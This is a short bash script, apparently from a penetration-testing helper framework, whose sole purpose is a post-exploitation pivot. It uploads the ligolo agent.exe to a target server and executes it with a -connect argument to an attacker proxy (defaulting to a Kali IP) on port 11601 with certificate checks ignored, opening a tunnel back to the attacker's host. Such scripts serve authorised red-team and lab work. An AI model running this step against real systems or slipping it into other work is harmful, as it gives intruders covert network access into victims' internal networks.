#!/bin/bash

: '
cmd: download ligolo agent.exe to server and connect to proxy
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PROXY_IP_FIELD=$(form_item  "proxy ip" "proxy_ip" "${KALI_IP}")

# Generate GUI form
generate_form "${PROXY_IP_FIELD}"

PROXY_IP=${form_data["proxy_ip"]}

LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
FILE="agent.exe"

cmd_upload_file "${LOCATION}" "${FILE}"

execute_command "${FILE_LOCATION} -connect ${PROXY_IP}:11601 -ignore-cert"
create_new_line
